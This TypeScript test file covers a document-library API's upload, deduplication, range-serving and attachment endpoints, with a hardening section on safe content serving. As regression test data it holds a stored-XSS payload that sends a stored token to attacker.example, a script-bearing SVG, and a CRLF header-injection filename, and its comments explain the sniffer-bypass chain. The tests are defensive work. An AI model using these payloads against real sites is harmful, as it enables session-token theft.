/**
 * `/api/v1/documents` and `/api/v1/attachments`.
 *
 * The two things worth proving here are the two ADR-0004 promises the API makes visible: that the
 * server computes the digest itself, and that a second upload of the same bytes links rather than
 * copies. Both are asserted against a real store on disk, so "no second copy" means no second file.
 */
import { createHash } from 'node:crypto';
import { readdirSync, statSync } from 'node:fs';
import { join } from 'node:path';

import { describe, expect, it } from 'vitest';

import { body, createItem, harness, multipart } from './helpers.js';

const PDF = Buffer.concat([
  Buffer.from('%PDF-1.4\n', 'ascii'),
  Buffer.from('1 0 obj<</Type/Catalog>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n', 'ascii'),
]);

const sha256 = (bytes: Buffer): string => createHash('sha256').update(bytes).digest('hex');

/** Every blob in the content-addressed store, so "was a second copy written" is answerable. */
const storedBlobs = (root: string): string[] => {
  const out: string[] = [];
  const walk = (path: string): void => {
    for (const entry of readdirSync(path, { withFileTypes: true })) {
      if (entry.name.startsWith('.')) continue;
      const full = join(path, entry.name);
      if (entry.isDirectory()) walk(full);
      else if (statSync(full).isFile()) out.push(entry.name);
    }
  };
  try {
    walk(root);
  } catch {
    /* the store has not been created yet */
  }
  return out;
};

describe('POST /api/v1/documents', () => {
  it('hashes the upload itself and stores it once', async () => {
    const h = await harness();
    try {
      const upload = multipart({ name: 'file', filename: 'paper.pdf', contentType: 'application/pdf', bytes: PDF });
      const response = await h.app.inject({
        method: 'POST',
        url: '/api/v1/documents',
        headers: upload.headers,
        payload: upload.payload,
      });

      expect(response.statusCode).toBe(201);
      const result = body(response);
      expect(result.created).toBe(true);
      expect(result.blobWritten).toBe(true);
      expect(result.attachmentId).toBeNull();

      const document = result.document as Record<string, unknown>;
      expect(document.sha256).toBe(sha256(PDF));
      expect(document.byteSize).toBe(PDF.byteLength);
      // Sniffed, not taken from the uploader's word (§3.3).
      expect(document.mimeType).toBe('application/pdf');
      expect(document.mimeSource).toBe('sniffed');
      expect(document.originalFilename).toBe('paper.pdf');
      expect(response.headers.etag).toBe(`"${sha256(PDF)}"`);

      expect(storedBlobs(h.config.storagePath)).toEqual([sha256(PDF)]);
    } finally {
      await h.close();
    }
  });

  it('tells the client the bytes were already here, and writes no second copy (D1)', async () => {
    const h = await harness();
    try {
      const send = async (filename: string) => {
        const upload = multipart({ name: 'file', filename, contentType: 'application/pdf', bytes: PDF });
        return h.app.inject({
          method: 'POST',
          url: '/api/v1/documents',
          headers: upload.headers,
          payload: upload.payload,
        });
      };

      const first = await send('paper.pdf');
      const second = await send('the-same-paper-again.pdf');

      expect(first.statusCode).toBe(201);
      expect(second.statusCode).toBe(200);
      expect(body(second).created).toBe(false);
      expect(body(second).blobWritten).toBe(false);
      expect((body(second).document as { id: string }).id).toBe(
        (body(first).document as { id: string }).id,
      );

      expect(storedBlobs(h.config.storagePath)).toEqual([sha256(PDF)]);
    } finally {
      await h.close();
    }
  });

  it('attaches to an item when the upload names one', async () => {
    const h = await harness();
    try {
      const item = await createItem(h);
      const upload = multipart(
        { name: 'file', filename: 'paper.pdf', contentType: 'application/pdf', bytes: PDF },
        { itemId: item.id as string, role: 'primary' },
      );

      const response = await h.app.inject({
        method: 'POST',
        url: '/api/v1/documents',
        headers: upload.headers,
        payload: upload.payload,
      });

      expect(response.statusCode).toBe(201);
      expect(body(response).attachmentId).toBeTypeOf('string');

      const attachments = body(
        await h.app.inject({ method: 'GET', url: `/api/v1/items/${item.id as string}/attachments` }),
      );
      expect((attachments.data as { role: string }[]).map((row) => row.role)).toEqual(['primary']);
    } finally {
      await h.close();
    }
  });

  it('refuses a body that is not multipart', async () => {
    const h = await harness();
    try {
      const response = await h.app.inject({
        method: 'POST',
        url: '/api/v1/documents',
        payload: { file: 'not really' },
      });
      expect(response.statusCode).toBe(415);
      expect(body(response).type).toBe('https://recueil.org/problems/validation');
    } finally {
      await h.close();
    }
  });

  it('refuses an unknown field in the multipart form', async () => {
    const h = await harness();
    try {
      const upload = multipart(
        { name: 'file', filename: 'paper.pdf', contentType: 'application/pdf', bytes: PDF },
        { itemid: 'lowercase typo' },
      );
      const response = await h.app.inject({
        method: 'POST',
        url: '/api/v1/documents',
        headers: upload.headers,
        payload: upload.payload,
      });
      expect(response.statusCode).toBe(422);
      expect(body(response).errors).toContainEqual(
        expect.objectContaining({ path: 'body.itemid' }),
      );
    } finally {
      await h.close();
    }
  });
});

describe('GET /api/v1/documents/{id}/content', () => {
  const upload = async (h: Awaited<ReturnType<typeof harness>>): Promise<string> => {
    const form = multipart({ name: 'file', filename: 'paper.pdf', contentType: 'application/pdf', bytes: PDF });
    const response = await h.app.inject({
      method: 'POST',
      url: '/api/v1/documents',
      headers: form.headers,
      payload: form.payload,
    });
    return (body(response).document as { id: string }).id;
  };

  it('serves the whole file with the digest as its ETag', async () => {
    const h = await harness();
    try {
      const id = await upload(h);
      const response = await h.app.inject({ method: 'GET', url: `/api/v1/documents/${id}/content` });

      expect(response.statusCode).toBe(200);
      expect(response.headers['content-type']).toBe('application/pdf');
      expect(response.headers['accept-ranges']).toBe('bytes');
      expect(response.headers.etag).toBe(`"${sha256(PDF)}"`);
      expect(response.rawPayload.equals(PDF)).toBe(true);
    } finally {
      await h.close();
    }
  });

  it('answers 304 when the client already holds it', async () => {
    const h = await harness();
    try {
      const id = await upload(h);
      const response = await h.app.inject({
        method: 'GET',
        url: `/api/v1/documents/${id}/content`,
        headers: { 'if-none-match': `"${sha256(PDF)}"` },
      });
      expect(response.statusCode).toBe(304);
      expect(response.rawPayload.byteLength).toBe(0);
    } finally {
      await h.close();
    }
  });

  it('serves a byte range', async () => {
    const h = await harness();
    try {
      const id = await upload(h);
      const response = await h.app.inject({
        method: 'GET',
        url: `/api/v1/documents/${id}/content`,
        headers: { range: 'bytes=0-7' },
      });

      expect(response.statusCode).toBe(206);
      expect(response.headers['content-range']).toBe(`bytes 0-7/${PDF.byteLength}`);
      expect(response.headers['content-length']).toBe('8');
      expect(response.rawPayload.toString('ascii')).toBe('%PDF-1.4');
    } finally {
      await h.close();
    }
  });

  it('serves a suffix range', async () => {
    const h = await harness();
    try {
      const id = await upload(h);
      const response = await h.app.inject({
        method: 'GET',
        url: `/api/v1/documents/${id}/content`,
        headers: { range: 'bytes=-6' },
      });
      expect(response.statusCode).toBe(206);
      expect(response.rawPayload.equals(PDF.subarray(PDF.byteLength - 6))).toBe(true);
    } finally {
      await h.close();
    }
  });

  it('refuses a range past the end of the document', async () => {
    const h = await harness();
    try {
      const id = await upload(h);
      const response = await h.app.inject({
        method: 'GET',
        url: `/api/v1/documents/${id}/content`,
        headers: { range: `bytes=${PDF.byteLength + 10}-` },
      });
      expect(response.statusCode).toBe(416);
      expect(response.headers['content-range']).toBe(`bytes */${PDF.byteLength}`);
    } finally {
      await h.close();
    }
  });

  it('finds a document by its digest', async () => {
    const h = await harness();
    try {
      const id = await upload(h);
      const response = await h.app.inject({
        method: 'GET',
        url: `/api/v1/documents/by-sha256/${sha256(PDF)}`,
      });
      expect(response.statusCode).toBe(200);
      expect(body(response).id).toBe(id);

      const missing = await h.app.inject({
        method: 'GET',
        url: `/api/v1/documents/by-sha256/${'0'.repeat(64)}`,
      });
      expect(missing.statusCode).toBe(404);
    } finally {
      await h.close();
    }
  });
});

/* ============================================================================================== */
/* The sandboxed disposition (hardening H4)                                                         */
/* ============================================================================================== */

/**
 * The Phase 2 review's stored-XSS proof, as a test.
 *
 * The chain it walks is worth restating, because each link looks harmless: `sniffMagic` returns
 * `null` for any byte sequence holding a control character below 0x09; `sniffMimeType` then falls
 * through to the *filename's* extension; `htm`/`html` map to `text/html`; and the content route
 * used to answer with `Content-Disposition: inline` and that type, on the API's own origin, with no
 * `nosniff` and no CSP. The filename is attacker-chosen — a zip member name or a MIME `filename`
 * parameter — so the whole of it is one uploaded file away. With `RECUEIL_REQUIRE_AUTH=false`, the
 * default, the script that runs has full scopes on `/api/v1`.
 *
 * The bytes below are the review's, with the `\x01` that defeats the sniffer.
 */
const HOSTILE_HTML = Buffer.concat([
  Buffer.from('<!--', 'utf8'),
  Buffer.of(0x01),
  Buffer.from(
    '--><script>fetch("https://attacker.example/"+localStorage.getItem("recueil.token"))</script><h1>Invoice</h1>',
    'utf8',
  ),
]);

/** A one-pixel GIF: a type the reader has to be able to show inline. */
const GIF = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');

const uploadBytes = async (
  h: Awaited<ReturnType<typeof harness>>,
  filename: string,
  bytes: Buffer,
  contentType = 'application/octet-stream',
): Promise<Record<string, unknown>> => {
  const form = multipart({ name: 'file', filename, contentType, bytes });
  const response = await h.app.inject({
    method: 'POST',
    url: '/api/v1/documents',
    headers: form.headers,
    payload: form.payload,
  });
  return body(response).document as Record<string, unknown>;
};

describe('the content route serves stored bytes from a sandbox', () => {
  it('will not serve attacker HTML inline on its own origin', async () => {
    const h = await harness();
    try {
      const document = await uploadBytes(h, 'invoice.html', HOSTILE_HTML);
      // The library really did type it as HTML from the filename: this is the state the review
      // reached, not a weakened version of it.
      expect(document.mimeType).toBe('text/html');
      expect(document.mimeSource).toBe('extension');

      const served = await h.app.inject({
        method: 'GET',
        url: `/api/v1/documents/${document.id as string}/content`,
      });

      expect(served.statusCode).toBe(200);
      // Not renderable as a document, by every mechanism at once.
      expect(served.headers['content-disposition']).toMatch(/^attachment;/u);
      expect(served.headers['content-type']).toBe('application/octet-stream');
      expect(served.headers['x-content-type-options']).toBe('nosniff');
      expect(served.headers['content-security-policy']).toContain("default-src 'none'");
      expect(served.headers['content-security-policy']).toContain("script-src 'none'");
      expect(served.headers['content-security-policy']).toContain('sandbox');
      expect(served.headers['x-frame-options']).toBe('DENY');
      // The bytes are still the bytes: this is a disposition change, not censorship.
      expect(served.rawPayload.equals(HOSTILE_HTML)).toBe(true);
    } finally {
      await h.close();
    }
  });

  it('will not serve an SVG inline either', async () => {
    const h = await harness();
    try {
      // The other way to choose the type: the sniffer declines (a control character again) and the
      // *declared* type wins, which is the uploader's `Content-Type` header. An SVG is a document
      // with a script context, so it is off the allow-list for the same reason HTML is.
      const document = await uploadBytes(
        h,
        'logo.svg',
        Buffer.concat([
          Buffer.of(0x01),
          Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>', 'utf8'),
        ]),
        'image/svg+xml',
      );
      expect(document.mimeType).toBe('image/svg+xml');
      expect(document.mimeSource).toBe('declared');

      const served = await h.app.inject({
        method: 'GET',
        url: `/api/v1/documents/${document.id as string}/content`,
      });
      expect(served.headers['content-disposition']).toMatch(/^attachment;/u);
      expect(served.headers['content-type']).not.toContain('svg');
      expect(served.headers['x-content-type-options']).toBe('nosniff');
    } finally {
      await h.close();
    }
  });

  it('serves plain text inline, but only as plain text and only with nosniff', async () => {
    const h = await harness();
    try {
      // The same bytes without the leading control character sniff as text, and text is on the
      // allow-list — safely, because `nosniff` is what stops a browser deciding it is really HTML.
      const document = await uploadBytes(
        h,
        'logo.svg',
        Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>', 'utf8'),
        'image/svg+xml',
      );
      expect(document.mimeType).toBe('text/plain');
      const served = await h.app.inject({
        method: 'GET',
        url: `/api/v1/documents/${document.id as string}/content`,
      });
      expect(served.headers['content-disposition']).toMatch(/^inline;/u);
      expect(served.headers['content-type']).toContain('text/plain');
      expect(served.headers['x-content-type-options']).toBe('nosniff');
    } finally {
      await h.close();
    }
  });

  it('still serves a PDF inline, in its own type, so the reader and the review preview work', async () => {
    const h = await harness();
    try {
      const document = await uploadBytes(h, 'paper.pdf', PDF, 'application/pdf');
      const served = await h.app.inject({
        method: 'GET',
        url: `/api/v1/documents/${document.id as string}/content`,
      });

      // `apps/web/src/review/subject-preview.tsx` renders `<object data={contentUrl}
      // type="application/pdf">`, which needs both of these, and `frame-ancestors` has to admit
      // the app's own origin or the object is blank.
      expect(served.headers['content-disposition']).toMatch(/^inline;/u);
      expect(served.headers['content-type']).toBe('application/pdf');
      expect(served.headers['x-content-type-options']).toBe('nosniff');
      expect(served.headers['content-security-policy']).toContain("frame-ancestors 'self'");
      expect(served.headers['content-security-policy']).not.toContain('sandbox');
      expect(served.headers['x-frame-options']).toBe('SAMEORIGIN');
      expect(served.headers['accept-ranges']).toBe('bytes');
      expect(served.rawPayload.equals(PDF)).toBe(true);
    } finally {
      await h.close();
    }
  });

  it('still serves an image inline', async () => {
    const h = await harness();
    try {
      const document = await uploadBytes(h, 'scan.gif', GIF, 'image/gif');
      const served = await h.app.inject({
        method: 'GET',
        url: `/api/v1/documents/${document.id as string}/content`,
      });
      expect(served.headers['content-disposition']).toMatch(/^inline;/u);
      expect(served.headers['content-type']).toBe('image/gif');
    } finally {
      await h.close();
    }
  });

  it('honours ?download=true for a type it would otherwise inline', async () => {
    const h = await harness();
    try {
      const document = await uploadBytes(h, 'paper.pdf', PDF, 'application/pdf');
      const served = await h.app.inject({
        method: 'GET',
        url: `/api/v1/documents/${document.id as string}/content?download=true`,
      });
      expect(served.headers['content-disposition']).toMatch(/^attachment;/u);
      // Still its own type: `?download=true` is a preference about the disposition, not a claim
      // that the bytes are dangerous.
      expect(served.headers['content-type']).toBe('application/pdf');
    } finally {
      await h.close();
    }
  });

  /**
   * The review's other finding at this route: `original_filename` comes from an archive member
   * name, which `safe-path.ts` permits to contain CR and LF, and Node's header validation then
   * threw `ERR_INVALID_CHAR` *inside* `reply.header` — escaping `sendProblem`, answering a raw
   * Fastify 500 in the second error format, and making the document's bytes permanently
   * unreachable through the API. A durable denial of access planted by whoever built the zip.
   */
  it('serves a document whose filename carries CR and LF', async () => {
    const h = await harness();
    try {
      // Ingested through the library rather than the multipart route, because the vehicle in the
      // review was a zip member name: `safe-path.ts` rejects NUL, absolute paths and `..` and
      // permits CR and LF, so the archive extractor hands exactly this string to `ingestBuffer`.
      // A multipart `filename` parameter cannot even carry a CRLF — the part header would not
      // survive it — so uploading is the one way in that this string cannot come from.
      const { document } = await h.recueil.documents.ingestBuffer(PDF, {
        sourceKind: 'folder',
        originalFilename: 'note\r\nX-Injected: yes\r\n\r\nBODY.pdf',
      });
      expect(document.originalFilename).toContain('X-Injected');

      const served = await h.app.inject({
        method: 'GET',
        url: `/api/v1/documents/${document.id}/content`,
      });

      expect(served.statusCode).toBe(200);
      const disposition = served.headers['content-disposition'] as string;
      // No CR and no LF is the whole of it: Node's own header validation is what stopped this from
      // being response splitting, and relying on it left the document unreachable instead.
      expect(disposition).not.toMatch(/[\r\n]/u);
      expect(disposition).toMatch(/^inline;/u);
      expect(served.rawPayload.equals(PDF)).toBe(true);
    } finally {
      await h.close();
    }
  });
});

describe('attachments', () => {
  const uploadTo = async (
    h: Awaited<ReturnType<typeof harness>>,
    itemId: string,
    bytes: Buffer,
    role = 'primary',
  ): Promise<{ documentId: string; attachmentId: string }> => {
    const form = multipart(
      { name: 'file', filename: 'f.pdf', contentType: 'application/pdf', bytes },
      { itemId, role },
    );
    const response = await h.app.inject({
      method: 'POST',
      url: '/api/v1/documents',
      headers: form.headers,
      payload: form.payload,
    });
    const result = body(response);
    return {
      documentId: (result.document as { id: string }).id,
      attachmentId: result.attachmentId as string,
    };
  };

  it('attaches an existing document to a second item without copying it (AT1)', async () => {
    const h = await harness();
    try {
      const first = await createItem(h);
      const second = await createItem(h, { title: 'Another', bibliographic: { title: 'Another' } });
      const { documentId } = await uploadTo(h, first.id as string, PDF);

      const response = await h.app.inject({
        method: 'POST',
        url: `/api/v1/items/${second.id as string}/attachments`,
        payload: { documentId, role: 'supplement', title: 'Shared dataset' },
      });

      expect(response.statusCode).toBe(201);
      expect(body(response).documentId).toBe(documentId);
      expect(storedBlobs(h.config.storagePath)).toEqual([sha256(PDF)]);
    } finally {
      await h.close();
    }
  });

  it('detaches without touching the document, and restores (AT2)', async () => {
    const h = await harness();
    try {
      const item = await createItem(h);
      const { documentId, attachmentId } = await uploadTo(h, item.id as string, PDF);

      const detached = await h.app.inject({ method: 'DELETE', url: `/api/v1/attachments/${attachmentId}` });
      expect(detached.statusCode).toBe(200);
      expect(body(detached).trashedAt).toBeTypeOf('string');

      // The document is untouched.
      expect(
        (await h.app.inject({ method: 'GET', url: `/api/v1/documents/${documentId}` })).statusCode,
      ).toBe(200);

      const restored = await h.app.inject({
        method: 'POST',
        url: `/api/v1/attachments/${attachmentId}/restore`,
      });
      expect(restored.statusCode).toBe(200);
      expect(body(restored).trashedAt).toBeNull();
    } finally {
      await h.close();
    }
  });

  it('refuses to trash a document a live attachment still references (D4)', async () => {
    const h = await harness();
    try {
      const item = await createItem(h);
      const { documentId } = await uploadTo(h, item.id as string, PDF);

      const response = await h.app.inject({
        method: 'POST',
        url: `/api/v1/documents/${documentId}/trash`,
      });
      expect(response.statusCode).toBe(409);
      expect(body(response).type).toBe('https://recueil.org/problems/integrity');
      expect(body(response).detail).toContain('D4');
    } finally {
      await h.close();
    }
  });

  it('reorders the attachments of an item', async () => {
    const h = await harness();
    try {
      const item = await createItem(h);
      const one = await uploadTo(h, item.id as string, Buffer.from('%PDF-1.4 one'), 'primary');
      const two = await uploadTo(h, item.id as string, Buffer.from('%PDF-1.4 two'), 'supplement');
      const three = await uploadTo(h, item.id as string, Buffer.from('%PDF-1.4 three'), 'data');

      const response = await h.app.inject({
        method: 'PUT',
        url: `/api/v1/items/${item.id as string}/attachments/order`,
        payload: { attachmentIds: [three.attachmentId, one.attachmentId] },
      });

      expect(response.statusCode).toBe(200);
      const order = (body(response).data as { id: string; position: number }[]).map((row) => row.id);
      // The named ones first, in the order given; anything left out keeps its relative place after.
      expect(order).toEqual([three.attachmentId, one.attachmentId, two.attachmentId]);
      expect((body(response).data as { position: number }[]).map((row) => row.position)).toEqual([0, 1, 2]);
    } finally {
      await h.close();
    }
  });

  it('refuses to reorder using an attachment from another item', async () => {
    const h = await harness();
    try {
      const first = await createItem(h);
      const second = await createItem(h, { title: 'Other', bibliographic: { title: 'Other' } });
      await uploadTo(h, first.id as string, PDF);
      const other = await uploadTo(h, second.id as string, Buffer.from('%PDF-1.4 other'));

      const response = await h.app.inject({
        method: 'PUT',
        url: `/api/v1/items/${first.id as string}/attachments/order`,
        payload: { attachmentIds: [other.attachmentId] },
      });
      expect(response.statusCode).toBe(404);
    } finally {
      await h.close();
    }
  });
});
